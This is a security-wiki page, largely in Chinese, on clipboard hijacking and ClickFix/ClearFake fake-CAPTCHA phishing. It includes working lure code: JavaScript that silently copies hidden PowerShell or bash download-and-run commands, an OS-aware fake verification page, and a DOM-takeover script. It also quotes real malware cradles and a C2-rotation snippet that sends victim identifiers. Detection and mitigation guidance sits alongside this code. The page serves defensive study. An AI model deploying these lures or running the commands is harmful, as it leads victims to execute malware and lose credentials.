# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> “永远不要粘贴任何不是你自己复制的内容。” – 这句古老但仍然有效的建议

## 概述

Clipboard hijacking – 也称为 *pastejacking* – 利用用户在复制粘贴命令时通常不会仔细检查内容的事实。恶意网页（或任何支持 JavaScript 的环境，例如 Electron 或 Desktop 应用）可以以编程方式将攻击者控制的文本放入系统剪贴板。受害者通常会被精心设计的 social-engineering 指示鼓励按 **Win + R**（Run 对话框）、**Win + X**（Quick Access / PowerShell），或打开终端并 *粘贴* 剪贴板内容，从而立即执行任意命令。

由于 **no file is downloaded and no attachment is opened**，该技术绕过了大多数监控附件、宏或直接命令执行的电子邮件和网页内容安全控制。因此该攻击在投放 NetSupport RAT、Latrodectus loader 或 Lumma Stealer 等常见 malware 家族的 phishing 活动中很受欢迎。

## Forced copy buttons and hidden payloads (macOS one-liners)

一些 macOS infostealers 会克隆安装器网站（例如 Homebrew），并 **强制使用“复制”按钮**，使用户无法仅选中可见文本。剪贴板条目包含期望的安装命令以及附加的 Base64 负载（例如 `...; echo <b64> | base64 -d | sh`），因此一次粘贴就会同时执行两部分，而 UI 隐藏了额外的阶段。

## JavaScript 概念验证
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
早期活动使用 `document.execCommand('copy')`，较新的则依赖异步的 **Clipboard API** (`navigator.clipboard.writeText`)。

## ClickFix / ClearFake 流程

1. 用户访问一个被错拼仿冒或被入侵的网站（例如 `docusign.sa[.]com`）
2. 被注入的 **ClearFake** JavaScript 调用一个 `unsecuredCopyToClipboard()` 辅助函数，静默地将一个 Base64 编码的 PowerShell 单行命令存入剪贴板。
3. HTML 指示告诉受害者：*“按 **Win + R**，粘贴命令并按回车以解决问题。”*
4. `powershell.exe` 执行，下载一个包含合法可执行文件和恶意 DLL 的归档（经典的 DLL sideloading）。
5. 加载器解密后续阶段，注入 shellcode 并安装持久化（例如计划任务）——最终运行 NetSupport RAT / Latrodectus / Lumma Stealer。

### NetSupport RAT 示例链
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (合法的 Java WebStart) 在其目录中搜索 `msvcp140.dll`.
* 该恶意 DLL 使用 **GetProcAddress** 动态解析 API，通过 **curl.exe** 下载两个二进制文件 (`data_3.bin`, `data_4.bin`)，使用滚动 XOR 密钥 `"https://google.com/"` 对它们解密，注入最终的 shellcode 并解压 **client32.exe** (NetSupport RAT) 到 `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. 使用 **curl.exe** 下载 `la.txt`
2. 在 **cscript.exe** 中执行 JScript downloader
3. 获取 MSI payload → 在一个签名应用旁放置 `libcef.dll` → DLL sideloading → shellcode → Latrodectus.

### 通过 MSHTA 的 Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** 调用启动了一个隐藏的 PowerShell 脚本，该脚本检索 `PartyContinued.exe`，提取 `Boat.pst`（CAB），通过 `extrac32` & 文件拼接重构 `AutoIt3.exe`，最后运行一个 `.a3x` 脚本，将浏览器凭据外传到 `sumeriavgv.digital`。

## ClickFix：剪贴板 → PowerShell → JS eval → Startup LNK，使用轮换的 C2（PureHVNC）

一些 ClickFix 活动完全跳过文件下载，指示受害者粘贴一个一行命令，该命令通过 WSH 获取并执行 JavaScript，使其持久化，并每天轮换 C2。已观察到的示例链：
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
关键特征
- 在运行时将混淆的 URL 反转以防止随意检查。
- JavaScript 通过 Startup LNK (WScript/CScript) 持久化自身，并按当前日期选择 C2 —— 实现快速域名轮换。

用于按日期轮换 C2 的最小 JS 片段：
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
后续阶段通常会部署一个 loader 来建立持久化并拉取 RAT（例如 PureHVNC），常常将 TLS 钉绑到硬编码证书并对流量进行分片。

Detection ideas specific to this variant
- 进程树： `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js`（或 `cscript.exe`）。
- 启动痕迹：在 `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` 的 LNK，调用 WScript/CScript 并使用位于 `%TEMP%`/`%APPDATA%` 下的 JS 路径。
- Registry/RunMRU 和命令行遥测包含 `.split('').reverse().join('')` 或 `eval(a.responseText)`。
- 重复出现的 `powershell -NoProfile -NonInteractive -Command -`，通过大的 stdin 负载传入长脚本以避免长命令行。
- 计划任务随后执行 LOLBins，例如在看起来像更新程序的任务/路径下执行 `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`（例如 `\GoogleSystem\GoogleUpdater`）。

威胁狩猎
- 每日轮换的 C2 主机名和 URL，符合 `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` 模式。
- 关联 clipboard 写入事件，随后 Win+R 粘贴，然后立即执行 `powershell.exe`。

蓝队可以结合 clipboard、进程创建和注册表遥测来定位 pastejacking 滥用：

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` 保存 **Win + R** 命令的历史记录 – 查找异常的 Base64 / 混淆条目。
* Security Event ID **4688**（Process Creation），其中 `ParentImage` == `explorer.exe` 且 `NewProcessName` 在 { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } 中。
* Event ID **4663**：在可疑的 4688 事件前，检查 `%LocalAppData%\Microsoft\Windows\WinX\` 或临时文件夹下的文件创建记录。
* EDR clipboard 传感器（如果存在）——关联 `Clipboard Write` 紧接着出现新的 PowerShell 进程。

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

近期活动大量生成伪造的 CDN/浏览器验证页面（“Just a moment…”，IUAM-style），强迫用户将剪贴板中的 OS 特定命令复制到本地控制台。这将执行从浏览器沙箱中弹出，并在 Windows 和 macOS 上均可实现。

构建器生成页面的主要特征
- 通过 `navigator.userAgent` 检测 OS 以定制有效载荷（Windows PowerShell/CMD vs. macOS Terminal）。对不支持的 OS 可选地显示诱饵/无操作以维持幻象。
- 在无害的 UI 操作（复选框/Copy）上自动将内容复制到剪贴板，而可见文本可能与剪贴板内容不同。
- 阻止移动端并显示带有逐步指引的弹出框：Windows → Win+R→粘贴→Enter；macOS → 打开 Terminal→粘贴→Enter。
- 可选的混淆和单文件注入器，用于用 Tailwind 风格的验证 UI 覆盖受感染站点的 DOM（无需注册新域）。

示例：剪贴板不匹配 + OS 感知的分支
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS 初始运行的持久化
- 使用 `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` 以便在终端关闭后继续执行，减少可见痕迹。

被攻陷站点的就地页面接管
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
检测与针对 IUAM 风格诱饵的 hunting 思路
- Web: 页面将 Clipboard API 绑定到验证控件；显示文本与剪贴板载荷不匹配；`navigator.userAgent` 分支；在可疑场景中使用 Tailwind + 单页替换。
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` 在浏览器交互后短时间内启动；从 `%TEMP%` 执行的 batch/MSI 安装程序。
- macOS endpoint: Terminal/iTerm 在接近浏览器事件时生成 `bash`/`curl`/`base64 -d` 并带有 `nohup`；后台作业在关闭终端后仍存活。
- 将 `RunMRU` Win+R 历史和剪贴板写入与后续控制台进程创建进行关联。

另见支持性技术

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 年 fake CAPTCHA / ClickFix 演进 (ClearFake, Scarlet Goldfinch)

- ClearFake 继续入侵 WordPress 站点并注入 loader JavaScript，该脚本串联外部主机（Cloudflare Workers、GitHub/jsDelivr），甚至发起区块链的 “etherhiding” 调用（例如向 Binance Smart Chain 的 API 端点 POST，如 `bsc-testnet.drpc[.]org`）以拉取当前诱饵逻辑。近期的覆盖层大量使用假 CAPTCHA，指示用户复制/粘贴一行命令（T1204.004），而不是下载任何东西。
- 初始执行越来越多地委派给已签名的 script hosts/LOLBAS。2026 年 1 月的链条将早先使用的 `mshta` 替换为通过 `WScript.exe` 执行的内置 `SyncAppvPublishingServer.vbs`，并传递类似 PowerShell 的参数（包含别名/通配符）以获取远程内容：
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` 已签名且通常由 App-V 使用；与 `WScript.exe` 及不寻常的参数（`gal`/`gcm` 别名、wildcarded cmdlets、jsDelivr URLs）配对时，它会成为 ClearFake 的一个高指示性 LOLBAS 阶段。
- 2026年2月，fake CAPTCHA payloads 又回到纯 PowerShell download cradles。两个实时示例：
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- 第一个链是一个内存中的 `iex(irm ...)` 抓取器；第二个阶段通过 `WinHttp.WinHttpRequest.5.1`，写入一个临时 `.ps1`，然后以隐藏窗口用 `-ep bypass` 启动。

Detection/hunting tips for these variants
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` or PowerShell cradles immediately after clipboard writes/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, or raw IP `iex(irm ...)` patterns.
- Network: outbound to CDN worker hosts or blockchain RPC endpoints from script hosts/PowerShell shortly after web browsing.
- File/registry: temporary `.ps1` creation under `%TEMP%` plus RunMRU entries containing these one-liners; block/alert on signed-script LOLBAS (WScript/cscript/mshta) executing with external URLs or obfuscated alias strings.

## 缓解措施

1. 浏览器强化 – 禁用剪贴板写入访问（`dom.events.asyncClipboard.clipboardItem` 等），或要求用户手势。
2. 安全意识 – 教导用户 *输入* 敏感命令或先将它们粘贴到文本编辑器中。
3. PowerShell Constrained Language Mode / Execution Policy + Application Control，以阻止任意 one-liners。
4. 网络控制 – 阻断到已知 pastejacking 和 malware C2 域名的出站请求。

## 相关技巧

* **Discord Invite Hijacking** 经常在诱导用户进入恶意服务器后滥用相同的 ClickFix 方法：

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
